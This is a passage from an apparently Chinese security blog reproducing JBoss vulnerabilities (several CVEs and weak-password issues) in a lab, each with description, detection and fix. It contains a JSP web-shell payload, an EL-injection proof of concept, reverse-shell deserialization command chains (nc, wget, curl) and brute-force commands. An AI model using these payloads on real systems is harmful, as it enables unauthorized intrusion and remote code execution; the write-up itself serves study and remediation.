class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">jboss-4.2.3.GA/server/default/deploy/jmx-console.war/WEB-INF/web.xml</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/Jboss/image-20200701103827156.png\" alt=\"image-20200701103827156\"></p>\n<h5 id=\"漏洞检测-1\"><a href=\"#漏洞检测-1\" class=\"headerlink\" title=\"漏洞检测\"></a>漏洞检测</h5><p>1、URL请求</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://172.16.144.139:8080/jmx-console/HtmlAdaptor?action=inspectMBean&amp;name=jboss.admin:service=DeploymentFileRepository</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/Jboss/image-20200701142719465.png\" alt=\"image-20200701142719465\"></p>\n<p>2、参数对应值</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> 路径</span></span><br><span class=\"line\">shell.war</span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> 文件名</span></span><br><span class=\"line\">shell</span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> 文件后缀</span></span><br><span class=\"line\">.jsp</span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> 文件内容</span></span><br><span class=\"line\">&lt;%Runtime.getRuntime().exec(request.getParameter(&quot;i&quot;));%&gt;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> 如POST提交需认证，修改请求方法未HEAD并复制POST数据至URL处</span></span><br><span class=\"line\">action=invokeOp&amp;name=jboss.admin:service=DeploymentFileRepository&amp;methodIndex=6&amp;arg0=../jmx-console.war/&amp;arg1=shell&amp;arg2=.jsp&amp;arg3=&lt;%Runtime.getRuntime().exec(request.getParameter(&quot;i&quot;));%&gt;&amp;arg4=True</span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> 访问(获取当前目录文件夹及文件)</span></span><br><span class=\"line\">http://172.16.144.139:8080/jmx-console/shell.jsp?i=touch%201.txt</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/Jboss/image-20200701153249170.png\" alt=\"image-20200701153249170\"></p>\n<p><img src=\"/images/Jboss/image-20200701152708158.png\" alt=\"image-20200701152708158\"></p>\n<p>3、shell新建文件</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://172.16.144.139:8080/shell/shell.jsp?i=touch%201.txt</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/Jboss/image-20200701152747850.png\" alt=\"image-20200701152747850\"></p>\n<p><img src=\"/images/Jboss/image-20200701152836122.png\" alt=\"image-20200701152836122\"></p>\n<h5 id=\"漏洞修复-2\"><a href=\"#漏洞修复-2\" class=\"headerlink\" title=\"漏洞修复\"></a>漏洞修复</h5><p>1、升级最新版本</p>\n<p>2、设置登录认证(参考CVE-2007-1036修复)</p>\n<h4 id=\"CVE-2010-1871\"><a href=\"#CVE-2010-1871\" class=\"headerlink\" title=\"CVE-2010-1871\"></a>CVE-2010-1871</h4><h5 id=\"漏洞描述-3\"><a href=\"#漏洞描述-3\" class=\"headerlink\" title=\"漏洞描述\"></a>漏洞描述</h5><p><code>JBossSeam</code>是一个<code>JavaEE5</code>框架，把JSF与<code>EJB3.0</code>组件合并在一起，从而为开发基于Web的企业应用程序提供一个最新的模式。</p>\n<p><code>JBossSeam</code>处理某些参数化<code>JBossEL</code>表达式的方式存在输入过滤漏洞。如果远程攻击者能够诱骗通过认证的<code>JBossSeam</code>用户访问特制的网页，就可能导致执行任意代码。</p>\n<h5 id=\"影响范围-3\"><a href=\"#影响范围-3\" class=\"headerlink\" title=\"影响范围\"></a>影响范围</h5><p>JBoss AS = 4.3.0（4.3.0属于企业版，导致部分环境没法搭建复现）</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//4.3.0等版本下载</span><br><span class=\"line\">http://ftp.riken.jp/Linux/redhat/ftp.redhat.com/jboss/eap/4.3.0/en/source/</span><br></pre></td></tr></table></figure>\n\n<h5 id=\"漏洞原理-3\"><a href=\"#漏洞原理-3\" class=\"headerlink\" title=\"漏洞原理\"></a>漏洞原理</h5><p>漏洞是通过<code>seam</code>组件中插入<code>#&#123;payload&#125;</code>进行模板注入，通过Java反射机制来获取到（<code>Java.lang.Runtime.getRuntime().exec()</code>方法），从而可以传入任何想要执行的命令。</p>\n<h5 id=\"漏洞检测-2\"><a href=\"#漏洞检测-2\" class=\"headerlink\" title=\"漏洞检测\"></a>漏洞检测</h5><p>1、漏洞位置描述</p>\n<p>漏洞是通过seam组件中插入#{payload}进行模板注入，可以在以下链接中插入要执行的方法，通过Java反射机制来获取到（<code>Java.lang.Runtime.getRuntime().exec()</code>方法）,从而可以传入任何想要执行的命令。</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/admin-console/login.seam?actionOutcome=/success.xhtml?user%3d%23&#123;&#125;的#&#123;&#125;</span><br></pre></td></tr></table></figure>\n\n<p>2、PoC</p>\n<p>cmd代表传入的远程命令。在<code>/admin-console/login.seam</code>路径下，POST传入构造好的<code>payload</code>，即可对此漏洞利用。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">actionOutcome=/success.xhtml?user%<span class=\"number\">3d</span>%<span class=\"number\">23</span>&#123;expressions.getClass().forName(<span class=\"string\">&#x27;Java.lang.Runtime&#x27;</span>).getDeclaredMethod(<span class=\"string\">&#x27;getRuntime&#x27;</span>).invoke(expressions.getClass().forName(<span class=\"string\">&#x27;Java.lang.Runtime&#x27;</span>)).exec(cmd)&#125;</span><br></pre></td></tr></table></figure>\n\n<h5 id=\"漏洞修复-3\"><a href=\"#漏洞修复-3\" class=\"headerlink\" title=\"漏洞修复\"></a>漏洞修复</h5><p>1、补丁修复</p>\n<h4 id=\"CVE-2013-4810\"><a href=\"#CVE-2013-4810\" class=\"headerlink\" title=\"CVE-2013-4810\"></a>CVE-2013-4810</h4><h5 id=\"漏洞描述-4\"><a href=\"#漏洞描述-4\" class=\"headerlink\" title=\"漏洞描述\"></a>漏洞描述</h5><p>此漏洞和<code>CVE-2015-7501</code>漏洞原理相同，两者的区别就在于两个漏洞选择的进行其中<code>JMXInvokerServlet</code>和<code>EJBInvokerServlet</code>利用的是<code>org.jboss.invocation.MarshalledValue</code>进行的反序列化操作，</p>\n<p>而<code>web-console/Invoker</code>利用的是<code>org.jboss.console.remote.RemoteMBeanInvocation</code>进行反序列化并上传构造好文件。</p>\n<h5 id=\"影响范围-4\"><a href=\"#影响范围-4\" class=\"headerlink\" title=\"影响范围\"></a>影响范围</h5><p>JBoss AS 6.X</p>\n<h5 id=\"漏洞原理-4\"><a href=\"#漏洞原理-4\" class=\"headerlink\" title=\"漏洞原理\"></a>漏洞原理</h5><h5 id=\"漏洞检测-3\"><a href=\"#漏洞检测-3\" class=\"headerlink\" title=\"漏洞检测\"></a>漏洞检测</h5><p>1、参考CVE-2015-7501</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x2F;&#x2F;漏洞路径</span><br><span class=\"line\">&#x2F;invoker&#x2F;EJBInvokerServlet</span><br><span class=\"line\">http:&#x2F;&#x2F;172.16.144.157:8080&#x2F;invoker&#x2F;EJBInvokerServlet</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/Jboss/image-20200702153308520.png\" alt=\"image-20200702153308520\"></p>\n<p>2、反弹shell</p>\n<p>直接参考CVE-2015-7501</p>\n<h5 id=\"漏洞修复-4\"><a href=\"#漏洞修复-4\" class=\"headerlink\" title=\"漏洞修复\"></a>漏洞修复</h5><p>1、<a href=\"https://access.redhat.com/security/cve/cve-2015-7501\">补丁</a></p>\n<h4 id=\"CVE-2015-7501\"><a href=\"#CVE-2015-7501\" class=\"headerlink\" title=\"CVE-2015-7501\"></a>CVE-2015-7501</h4><h5 id=\"漏洞描述-5\"><a href=\"#漏洞描述-5\" class=\"headerlink\" title=\"漏洞描述\"></a>漏洞描述</h5><p>由于<code>JBoss</code>中<code>invoker/JMXInvokerServlet</code>路径对外开放，JBoss的<code>jmx</code>组件⽀持Java反序列化导致产生漏洞。</p>\n<h5 id=\"影响范围-5\"><a href=\"#影响范围-5\" class=\"headerlink\" title=\"影响范围\"></a>影响范围</h5><p>JBoss AS 6.x</p>\n<h5 id=\"漏洞原理-5\"><a href=\"#漏洞原理-5\" class=\"headerlink\" title=\"漏洞原理\"></a>漏洞原理</h5><p>由于<code>JBoss</code>中<code>invoker/JMXInvokerServlet</code>路径对外开放</p>\n<h5 id=\"漏洞检测-4\"><a href=\"#漏洞检测-4\" class=\"headerlink\" title=\"漏洞检测\"></a>漏洞检测</h5><p>1、PoC</p>\n<p>浏览器直接访问域名，如出现下载文档即可确定存在漏洞。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http:&#x2F;&#x2F;172.16.144.156:8080&#x2F;invoker&#x2F;JMXInvokerServlet</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/Jboss/image-20200702122358123.png\" alt=\"image-20200702122358123\"></p>\n<p>2、反弹shell</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> nc -lvnp 5555(攻击主机执行监听)</span></span><br><span class=\"line\">//攻击主机目录下下载</span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> wget http://scan.javasec.cn/java/JavaDeserH2HC.zip</span></span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> unzip JavaDeserH2HC.zip</span></span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> <span class=\"built_in\">cd</span> JavaDeserH2HC(以下命令均在攻击主机目录下执行，执行java生成序列化数据)</span></span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> javac -cp .:commons-collections-3.2.1.jar ReverseShellCommonsCollectionsHashMap.java</span></span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> java -cp .:commons-collections-3.2.1.jar  ReverseShellCommonsCollectionsHashMap 172.16.144.157:5555\t\t\t\t(攻击主机及端口号)</span></span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> curl http://172.16.144.157:8080/invoker/<span class=\"built_in\">readonly</span> --data-binary @ReverseShellCommonsCollectionsHashMap.ser</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/Jboss/image-20200702134459047.png\" alt=\"image-20200702134459047\"></p>\n<h5 id=\"漏洞修复-5\"><a href=\"#漏洞修复-5\" class=\"headerlink\" title=\"漏洞修复\"></a>漏洞修复</h5><p>1、<a href=\"https://access.redhat.com/security/cve/cve-2015-7501\">补丁</a></p>\n<h4 id=\"CVE-2017-7504\"><a href=\"#CVE-2017-7504\" class=\"headerlink\" title=\"CVE-2017-7504\"></a>CVE-2017-7504</h4><h5 id=\"漏洞描述-6\"><a href=\"#漏洞描述-6\" class=\"headerlink\" title=\"漏洞描述\"></a>漏洞描述</h5><p>JBoss AS 4.x及之前版本中，JbossMQ实现过程的<code>JMS over HTTP Invocation Layer</code>的<br>HTTPServerILServlet.java⽂件存在反序列化漏洞，远程攻击者可借助特制的序列化数据利⽤<br>该漏洞执⾏任意代码。</p>\n<h5 id=\"影响范围-6\"><a href=\"#影响范围-6\" class=\"headerlink\" title=\"影响范围\"></a>影响范围</h5><p>JBoss AS 4.x之前版本</p>\n<h5 id=\"漏洞原理-6\"><a href=\"#漏洞原理-6\" class=\"headerlink\" title=\"漏洞原理\"></a>漏洞原理</h5><p>JBoss AS 4.x及之前版本中，JbossMQ实现过程的<code>JMS over HTTP Invocation Layer</code>的<br>HTTPServerILServlet.java⽂件存在反序列化漏洞。</p>\n<h5 id=\"漏洞检测-5\"><a href=\"#漏洞检测-5\" class=\"headerlink\" title=\"漏洞检测\"></a>漏洞检测</h5><p>1、PoC</p>\n<p>访问域名，如出现以下返回可能存在漏洞。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">172.16.144.157:8080&#x2F;jbossmq-httpil&#x2F;HTTPServerILServlet</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/Jboss/image-20200702140433362.png\" alt=\"image-20200702140433362\"></p>\n<p>2、反弹shell</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> nc -lvnp 6666(攻击主机执行监听)</span></span><br><span class=\"line\">//攻击主机目录下下载</span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> wget http://scan.javasec.cn/java/JavaDeserH2HC.zip</span></span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> unzip JavaDeserH2HC.zip</span></span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> <span class=\"built_in\">cd</span> JavaDeserH2HC(以下命令均在攻击主机目录下执行，执行java生成序列化数据)</span></span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> javac -cp .:commons-collections-3.2.1.jar ReverseShellCommonsCollectionsHashMap.java</span></span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> java -cp .:commons-collections-3.2.1.jar  ReverseShellCommonsCollectionsHashMap 172.16.144.157:6666\t\t\t\t(攻击主机及端口号)</span></span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> curl http://172.16.144.157:8080/jbossmq-httpil/HTTPServerILServlet --data-binary @ReverseShellCommonsCollectionsHashMap.ser</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/Jboss/image-20200702142036913.png\" alt=\"image-20200702142036913\"></p>\n<p><img src=\"/images/Jboss/image-20200702142043798.png\" alt=\"image-20200702142043798\"></p>\n<h5 id=\"漏洞修复-6\"><a href=\"#漏洞修复-6\" class=\"headerlink\" title=\"漏洞修复\"></a>漏洞修复</h5><p>1、版本升级</p>\n<h4 id=\"CVE-2017-12149\"><a href=\"#CVE-2017-12149\" class=\"headerlink\" title=\"CVE-2017-12149\"></a>CVE-2017-12149</h4><h5 id=\"漏洞描述-7\"><a href=\"#漏洞描述-7\" class=\"headerlink\" title=\"漏洞描述\"></a>漏洞描述</h5><p>此漏洞主要是由于<code>jboss\\server\\all\\deploy\\httpha-invoker.sar\\invoker.war\\WEB-INF\\classes\\org\\jboss\\invocation\\http\\servlet</code>目录下的<code>ReadOnlyAccessFilter.class</code>文件中的<code>doFilter</code>方法，再将序列化传入<code>ois</code>中，并没有进行过滤便调用了<code>readObject()</code>进行反序列化，导致传入的携带恶意代码的序列化数据执行，造成了反序列化的漏洞。</p>\n<h5 id=\"影响范围-7\"><a href=\"#影响范围-7\" class=\"headerlink\" title=\"影响范围\"></a>影响范围</h5><p>JBossAS 5.x</p>\n<p>JBossAS 6.x</p>\n<h5 id=\"漏洞原理-7\"><a href=\"#漏洞原理-7\" class=\"headerlink\" title=\"漏洞原理\"></a>漏洞原理</h5><p>该漏洞存在于JBoss AS的HttpInvoker 组件中的ReadOnlyAccessFilter 过滤器中。该过滤器在没有进行任何安全检查的情况下尝试将来自客户端的数据流进行反序列化，从而导致了漏洞。</p>\n<h5 id=\"漏洞检测-6\"><a href=\"#漏洞检测-6\" class=\"headerlink\" title=\"漏洞检测\"></a>漏洞检测</h5><p>1、版本确定</p>\n<p><img src=\"/images/Jboss/image-20200630152601209.png\" alt=\"image-20200630152601209\"></p>\n<p>2、PoC访问</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://172.16.144.135:8080/invoker/readonly</span><br><span class=\"line\">//如出现500可确定目标主机存在漏洞</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/Jboss/image-20200630152657545.png\" alt=\"image-20200630152657545\"></p>\n<p>3、反弹shell</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> nc -lvnp 8888(攻击主机执行监听)</span></span><br><span class=\"line\">//攻击主机目录下下载</span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> wget http://scan.javasec.cn/java/JavaDeserH2HC.zip</span></span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> unzip JavaDeserH2HC.zip</span></span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> <span class=\"built_in\">cd</span> JavaDeserH2HC(以下命令均在攻击主机目录下执行，执行java生成序列化数据)</span></span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> javac -cp .:commons-collections-3.2.1.jar ReverseShellCommonsCollectionsHashMap.java</span></span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> java -cp .:commons-collections-3.2.1.jar  ReverseShellCommonsCollectionsHashMap 172.16.144.135:8888\t\t\t\t(攻击主机及端口号)</span></span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> curl http://172.16.144.135:8080/invoker/<span class=\"built_in\">readonly</span> --data-binary @ReverseShellCommonsCollectionsHashMap.ser</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/Jboss/image-20200630221608353.png\" alt=\"image-20200630221608353\"></p>\n<p><img src=\"/images/Jboss/image-20200630221503084.png\" alt=\"image-20200630221503084\"></p>\n<h5 id=\"漏洞修复-7\"><a href=\"#漏洞修复-7\" class=\"headerlink\" title=\"漏洞修复\"></a>漏洞修复</h5><p>1、删除http-invoker.sar组件</p>\n<p>2、版本升级(此漏洞只存在AS5、AS6)</p>\n<h4 id=\"Administration-Console-弱口令\"><a href=\"#Administration-Console-弱口令\" class=\"headerlink\" title=\"Administration Console 弱口令\"></a>Administration Console 弱口令</h4><h5 id=\"漏洞描述-8\"><a href=\"#漏洞描述-8\" class=\"headerlink\" title=\"漏洞描述\"></a>漏洞描述</h5><p><code>Administration Console</code>存在默认密码<code>admin admin</code>,我们可以登录到后台部署war包<code>getshell</code></p>\n<h5 id=\"影响范围-8\"><a href=\"#影响范围-8\" class=\"headerlink\" title=\"影响范围\"></a>影响范围</h5><p>全版本</p>\n<h5 id=\"漏洞原理-8\"><a href=\"#漏洞原理-8\" class=\"headerlink\" title=\"漏洞原理\"></a>漏洞原理</h5><p>JBoss默认Console是admin/admin.</p>\n<h5 id=\"漏洞检测-7\"><a href=\"#漏洞检测-7\" class=\"headerlink\" title=\"漏洞检测\"></a>漏洞检测</h5><p>1、访问以下URL</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://172.16.144.157:8080/jmx-console/</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/Jboss/image-20200702151249993.png\" alt=\"image-20200702151249993\"></p>\n<p>2、远程部署war</p>\n<p>这部分直接参考<code>CVE-2007-1036</code>操作基本一致</p>\n<h5 id=\"漏洞修复-8\"><a href=\"#漏洞修复-8\" class=\"headerlink\" title=\"漏洞修复\"></a>漏洞修复</h5><p>1、修改默认账户及密码（足够强壮）</p>\n<h4 id=\"JBoss-gt-7-x弱口令及爆破\"><a href=\"#JBoss-gt-7-x弱口令及爆破\" class=\"headerlink\" title=\"JBoss &gt;7.x弱口令及爆破\"></a>JBoss &gt;7.x弱口令及爆破</h4><h5 id=\"漏洞描述-9\"><a href=\"#漏洞描述-9\" class=\"headerlink\" title=\"漏洞描述\"></a>漏洞描述</h5><p><code>jboss</code>从8开始正式更名为<code>WildFly</code> ,在<code>WildFly8</code>之后的版本添加控制台用户时默认就会执行强密码策略,所以相对于之前低版本的<code>jboss</code>,针对<code>WildFly</code>之后版本的弱口令推荐<code>wildPwn</code>自动化爆破工具。</p>\n<h5 id=\"漏洞范围\"><a href=\"#漏洞范围\" class=\"headerlink\" title=\"漏洞范围\"></a>漏洞范围</h5><p>JBoss &gt;7.x（wildFly所需jdk版本为7及以上才行）</p>\n<h5 id=\"漏洞原理-9\"><a href=\"#漏洞原理-9\" class=\"headerlink\" title=\"漏洞原理\"></a>漏洞原理</h5><p>JBoss 8之后开始更名为<code>WildFly</code>其默认采用强密码策略，但也会存在可爆破风险。</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//部署指定目录</span><br><span class=\"line\">/usr/local/wildfly-8.0.0.Final</span><br><span class=\"line\">//修改环境路径</span><br><span class=\"line\">export JBOSS_HOME=/usr/local/wildfly-8.0.0.Final/</span><br><span class=\"line\">export PATH=$PATH:$JBOSS_HOME/bin</span><br><span class=\"line\">//添加新账户</span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> ./add-user.sh</span></span><br><span class=\"line\">What type of user do you wish to add?</span><br><span class=\"line\"> a) Management User (mgmt-users.properties)</span><br><span class=\"line\"> b) Application User (application-users.properties)</span><br><span class=\"line\">(a): a</span><br><span class=\"line\"></span><br><span class=\"line\">Enter the details of the new user to add.</span><br><span class=\"line\">Using realm &#x27;ManagementRealm&#x27; as discovered from the existing property files.</span><br><span class=\"line\">Username : admin</span><br><span class=\"line\">The username &#x27;admin&#x27; is easy to guess</span><br><span class=\"line\">Are you sure you want to add user &#x27;admin&#x27; yes/no? yes</span><br><span class=\"line\">Password recommendations are listed below. To modify these restrictions edit the add-user.properties configuration file.</span><br><span class=\"line\"> - The password should not be one of the following restricted values &#123;root, admin, administrator&#125;</span><br><span class=\"line\"> - The password should contain at least 8 characters, 1 alphanumeric character(s), 1 digit(s), 1 non-alphanumeric symbol(s)</span><br><span class=\"line\"> - The password should be different from the username</span><br><span class=\"line\">Password :</span><br><span class=\"line\">JBAS015269: Password must have at least 8 characters!</span><br><span class=\"line\">Are you sure you want to use the password entered yes/no? yes</span><br><span class=\"line\">Re-enter Password :</span><br><span class=\"line\">What groups do you want this user to belong to? (Please enter a comma separated list, or leave blank for none)[  ]:</span><br><span class=\"line\">About to add user &#x27;admin&#x27; for realm &#x27;ManagementRealm&#x27;</span><br><span class=\"line\">Is this correct yes/no? yes</span><br><span class=\"line\">Added user &#x27;admin&#x27; to file &#x27;/usr/local/wildfly-8.0.0.Final/standalone/configuration/mgmt-users.properties&#x27;</span><br><span class=\"line\">Added user &#x27;admin&#x27; to file &#x27;/usr/local/wildfly-8.0.0.Final/domain/configuration/mgmt-users.properties&#x27;</span><br><span class=\"line\">Added user &#x27;admin&#x27; with groups  to file &#x27;/usr/local/wildfly-8.0.0.Final/standalone/configuration/mgmt-groups.properties&#x27;</span><br><span class=\"line\">Added user &#x27;admin&#x27; with groups  to file &#x27;/usr/local/wildfly-8.0.0.Final/domain/configuration/mgmt-groups.properties&#x27;</span><br><span class=\"line\">Is this new user going to be used for one AS process to connect to another AS process?</span><br><span class=\"line\">e.g. for a slave host controller connecting to the master or for a Remoting connection for server to server EJB calls.</span><br><span class=\"line\">yes/no? yes</span><br><span class=\"line\">To represent the user add the following to the server-identities definition &lt;secret value=&quot;dG9vcg==&quot; /&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">//启动JBoss(静默启动，程序会在后台运行)</span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> ./standalone.sh -Djboss.bind.address=0.0.0.0 -Djboss.bind.address.management=0.0.0.0&amp;</span></span><br></pre></td></tr></table></figure>\n\n<h5 id=\"漏洞检测-8\"><a href=\"#漏洞检测-8\" class=\"headerlink\" title=\"漏洞检测\"></a>漏洞检测</h5><p>1、URL访问</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//默认监听端口在9990</span><br><span class=\"line\">http://172.16.144.158:9990/</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/Jboss/image-20200702202856723.png\" alt=\"image-20200702202856723\"></p>\n<p>2、爆破</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> git <span class=\"built_in\">clone</span> https://github.com/hlldz/wildPwn.git</span></span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> <span class=\"built_in\">cd</span> wildPwn</span></span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> python wildPwn.py -m brute --target 172.16.144.183 --port 8080 -user userList.txt -pass passList.txt</span></span><br><span class=\"line\"></span><br><span class=\"line\">nmap ‐n -Pn ‐‐script=wildfly‐brute.nse ‐‐script‐args &quot;userdb=userList.txt,passdb=pass.txt,hostname=domain.com&quot; 172.16.144.183 -p9990</span><br></pre></td></tr></table></figure>\n\n<p>貌似这个工具并没法实现爆破。</p>\n<h5 id=\"漏洞修复-9\"><a href=\"#漏洞修复-9\" class=\"headerlink\" title=\"漏洞修复\"></a>漏洞修复</h5><p>1、配置强口令</p>\n<p>2、限制来源IP</p>\n<h3 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h3><p>以上CVE汇总根据网上各大佬汇总得到，其中部分CVE使用的<code>JavaDeserH2HC</code>工具已经在环境搭建部分贴出；还有很多其他工具请自行github或google了。</p>\n<h3 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">https:&#x2F;&#x2F;www.freebuf.com&#x2F;articles&#x2F;web&#x2F;240174.html</span><br><span class=\"line\">https:&#x2F;&#x2F;bugzilla.redhat.com&#x2F;show_bug.cgi?id&#x3D;615956</span><br></pre></td></tr></table></figure>\n\n","site":{"data":{}},"excerpt":"","more":"<p>JBoss是一套开源的企业级 Java 中间件系统，用于实现基于 SOA 的企业应用和服务</p>\n<p>JBoss AS 开源社区版本，发布比较频繁。JBoss 7 ，先后发布了 7.0.0, 7.0.1, 7.0.2, 7.1.0, 7.1.1, 7.1.2, 7.1.3, 7.2.0，其中 7.1.1 比较经典，7.2.0 是 JBoss EAP 6.1 的基础zhi，但7.1.2, 7.1.3, 7.2.0 只是源代码打了 Tag，并没提供开放下载。</p>\n<p>JBoss EAP（Enterprise Application Platform） 在开源版本上构建的企业版本，目前Redhat 已经将 JBoss EAP 放在 JBoss.org 开放下载，开发人无需注册 Redhat （之前是必须有 Redhat.com 账号才能下载 JBoss EAP）。</p>\n<p>Wildfly 是 JBoss AS 新的项目名称，从 8 开始，新的 JBoss AS 